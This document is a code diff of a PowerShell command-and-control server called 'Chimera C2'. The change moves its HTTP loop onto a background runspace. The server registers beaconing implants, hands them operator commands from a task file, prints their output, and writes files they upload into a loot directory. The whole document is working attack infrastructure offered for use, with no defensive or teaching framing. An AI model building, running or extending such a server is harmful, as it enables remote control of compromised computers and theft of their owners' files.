@@ -1,4 +1,4 @@
-# Chimera C2 server - blocking GetContext on background thread
+# Chimera C2 server
 # Usage: powershell -ExecutionPolicy Bypass -File c2server.ps1
 
 param(
@@ -12,17 +12,13 @@ $ErrorActionPreference = "Continue"
 New-Item -ItemType Directory -Force -Path $LootDir | Out-Null
 New-Item -ItemType Directory -Force -Path "C:\Temp"  | Out-Null
 
-$script:AgentUUID = $null
-
-function New-TID { [System.Guid]::NewGuid().ToString("N").Substring(0,16) }
-
-function Decode($raw) {
-    try {
-        $b = [System.Convert]::FromBase64String($raw.Trim())
-        if ($b.Length -gt 36) { return [System.Text.Encoding]::UTF8.GetString($b, 36, $b.Length - 36) }
-    } catch {}
-    return $raw
-}
+$listener = New-Object System.Net.HttpListener
+$listener.Prefixes.Add($Bind)
+$listener.Start()
+Write-Host "[C2] Listening on $Bind"
+Write-Host "[C2] Task queue:  Set-Content $TaskFile 'command params'"
+Write-Host "[C2] Press Ctrl+C to stop"
+Write-Host ""
 
 function Wrap($json) {
     $uuid = "aabbccdd-aabb-aabb-aabb-aabbccddeeff"
@@ -34,55 +30,72 @@ function Wrap($json) {
     return [System.Convert]::ToBase64String($c)
 }
 
-$listener = New-Object System.Net.HttpListener
-$listener.Prefixes.Add($Bind)
-$listener.Start()
-Write-Host "[C2] Listening on $Bind"
-Write-Host "[C2] Task queue:  Set-Content $TaskFile 'command params'"
-Write-Host "[C2] Press Ctrl+C to stop"
-Write-Host ""
+function DecodeBody($raw) {
+    try {
+        $b = [System.Convert]::FromBase64String($raw.Trim())
+        if ($b.Length -gt 36) { return [System.Text.Encoding]::UTF8.GetString($b, 36, $b.Length - 36) }
+    } catch {}
+    return $raw
+}
 
-# Handle requests on a background thread so the main thread can read console
-$listenerRef = $listener
-$http_thread = [System.Threading.Thread]::new({
-    param($l, $ld, $tf)
-    while ($l.IsListening) {
+# Run HTTP loop on a background runspace so main thread stays alive
+$rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
+$rs.Open()
+$rs.SessionStateProxy.SetVariable("listener", $listener)
+$rs.SessionStateProxy.SetVariable("LootDir",  $LootDir)
+$rs.SessionStateProxy.SetVariable("TaskFile", $TaskFile)
+
+$ps = [System.Management.Automation.PowerShell]::Create()
+$ps.Runspace = $rs
+[void]$ps.AddScript({
+    function Wrap($json) {
+        $uuid = "aabbccdd-aabb-aabb-aabb-aabbccddeeff"
+        $ub = [System.Text.Encoding]::UTF8.GetBytes($uuid)
+        $jb = [System.Text.Encoding]::UTF8.GetBytes($json)
+        $c  = New-Object byte[]($ub.Length + $jb.Length)
+        [Array]::Copy($ub,0,$c,0,$ub.Length)
+        [Array]::Copy($jb,0,$c,$ub.Length,$jb.Length)
+        return [System.Convert]::ToBase64String($c)
+    }
+
+    while ($listener.IsListening) {
         try {
-            $ctx  = $l.GetContext()
+            $ctx  = $listener.GetContext()
             $req  = $ctx.Request
             $resp = $ctx.Response
             $ts   = (Get-Date).ToString("HH:mm:ss")
 
             $ms = New-Object System.IO.MemoryStream
             if ($req.HasEntityBody) { $req.InputStream.CopyTo($ms) }
-            $raw  = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
-            $body = & {
-                try {
-                    $b = [System.Convert]::FromBase64String($raw.Trim())
-                    if ($b.Length -gt 36) { return [System.Text.Encoding]::UTF8.GetString($b,36,$b.Length-36) }
-                } catch {}
-                return $raw
-            }
+            $raw = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
 
-            $uuid = "aabbccdd-aabb-aabb-aabb-aabbccddeeff"
+            # Decode base64+UUID envelope
+            $body = $raw
+            try {
+                $b = [System.Convert]::FromBase64String($raw.Trim())
+                if ($b.Length -gt 36) { $body = [System.Text.Encoding]::UTF8.GetString($b, 36, $b.Length - 36) }
+            } catch {}
+
             $replyJson = "{}"
 
             if ($body -match '"action"\s*:\s*"checkin"') {
-                if ($body -match '"uuid"\s*:\s*"([^"]+)"') { $script:AgentUUID = $Matches[1] }
-                elseif (-not $script:AgentUUID) { $script:AgentUUID = [System.Guid]::NewGuid().ToString() }
-                $replyJson = '{"action":"checkin","id":"' + $script:AgentUUID + '","tasks":[]}'
-                [Console]::WriteLine("[$ts] >>> CHECKIN  agent=$($script:AgentUUID)")
+                $agentID = "unknown"
+                if ($body -match '"uuid"\s*:\s*"([^"]+)"') { $agentID = $Matches[1] }
+                $replyJson = '{"action":"checkin","id":"' + $agentID + '","tasks":[]}'
+                [Console]::WriteLine("[$ts] >>> CHECKIN  agent=$agentID")
 
             } elseif ($body -match '"action"\s*:\s*"get_tasking"') {
                 $tasks = "[]"
-                if (Test-Path $tf) {
-                    $fc = (Get-Content $tf -Raw).Trim()
-                    Remove-Item $tf -Force -ErrorAction SilentlyContinue
+                if (Test-Path $TaskFile) {
+                    $fc = (Get-Content $TaskFile -Raw).Trim()
+                    Remove-Item $TaskFile -Force -ErrorAction SilentlyContinue
                     if ($fc -match '^(\S+)\s*(.*)$') {
-                        $tc=$Matches[1]; $tp=$Matches[2].Trim(); $tid=[System.Guid]::NewGuid().ToString("N").Substring(0,16)
-                        $safe=$tp -replace '\\','\\' -replace '"','\"'
-                        $tasks='[{"id":"'+$tid+'","command":"'+$tc+'","parameters":"'+$safe+'"}]'
-                        [Console]::WriteLine("[$ts] >>> TASK: $tc [$tp]")
+                        $tc  = $Matches[1]
+                        $tp  = $Matches[2].Trim()
+                        $tid = [System.Guid]::NewGuid().ToString("N").Substring(0,16)
+                        $safe = $tp -replace '\\','\\' -replace '"','\"'
+                        $tasks = '[{"id":"'+$tid+'","command":"'+$tc+'","parameters":"'+$safe+'"}]'
+                        [Console]::WriteLine("[$ts] >>> TASK: $tc [$tp]  id=$tid")
                     }
                 } else {
                     [Console]::WriteLine("[$ts]     beacon (idle)")
@@ -92,10 +105,12 @@ $http_thread = [System.Threading.Thread]::new({
             } elseif ($body -match '"action"\s*:\s*"post_response"') {
                 if ($body -match '"download"') {
                     $fname = "loot_$((Get-Date).ToString('HHmmss')).bin"
-                    if ($body -match '"full_path"\s*:\s*"([^"]+)"') { $fname = [System.IO.Path]::GetFileName(($Matches[1] -replace '\\\\','\')) }
+                    if ($body -match '"full_path"\s*:\s*"([^"]+)"') {
+                        $fname = [System.IO.Path]::GetFileName(($Matches[1] -replace '\\\\','\'))
+                    }
                     if ($body -match '"chunk_data"\s*:\s*"([A-Za-z0-9+/=]+)"') {
                         $data = [System.Convert]::FromBase64String($Matches[1])
-                        $out  = [System.IO.Path]::Combine($ld, $fname)
+                        $out  = [System.IO.Path]::Combine($LootDir, $fname)
                         [System.IO.File]::WriteAllBytes($out, $data)
                         [Console]::WriteLine("[$ts] <<< FILE: $fname  ($([int]($data.Length/1024)) KB) -> $out")
                     }
@@ -104,7 +119,7 @@ $http_thread = [System.Threading.Thread]::new({
                         $out = $Matches[1] -replace '\\n',"`n" -replace '\\"','"'
                         [Console]::WriteLine("[$ts] <<< OUTPUT:`n$out`n")
                     } else {
-                        [Console]::WriteLine("[$ts] <<< post_response")
+                        [Console]::WriteLine("[$ts] <<< post_response (no output field)")
                     }
                 }
                 $replyJson = '{"action":"post_response","responses":[]}'
@@ -113,15 +128,10 @@ $http_thread = [System.Threading.Thread]::new({
                 [Console]::WriteLine("[$ts] <<< unknown ($($body.Length) chars)")
             }
 
-            # Wrap and send
-            $ub2 = [System.Text.Encoding]::UTF8.GetBytes($uuid)
-            $jb2 = [System.Text.Encoding]::UTF8.GetBytes($replyJson)
-            $c2  = New-Object byte[]($ub2.Length+$jb2.Length)
-            [Array]::Copy($ub2,0,$c2,0,$ub2.Length); [Array]::Copy($jb2,0,$c2,$ub2.Length,$jb2.Length)
-            $rb  = [System.Text.Encoding]::UTF8.GetBytes([System.Convert]::ToBase64String($c2))
-            $resp.ContentType = "application/json"
+            $rb = [System.Text.Encoding]::UTF8.GetBytes((Wrap $replyJson))
+            $resp.ContentType     = "application/json"
             $resp.ContentLength64 = $rb.Length
-            $resp.OutputStream.Write($rb,0,$rb.Length)
+            $resp.OutputStream.Write($rb, 0, $rb.Length)
             $resp.Close()
 
         } catch [System.Net.HttpListenerException] {
@@ -132,13 +142,15 @@ $http_thread = [System.Threading.Thread]::new({
         }
     }
 })
-$http_thread.IsBackground = $true
-$http_thread.Start($listener, $LootDir, $TaskFile)
 
-# Main thread: just keep alive until Ctrl+C
+$handle = $ps.BeginInvoke()
+
+# Keep main thread alive
 try {
     while ($listener.IsListening) { Start-Sleep -Seconds 1 }
 } finally {
     $listener.Stop()
+    $ps.Stop()
+    $rs.Close()
     Write-Host "[C2] Stopped."
 }
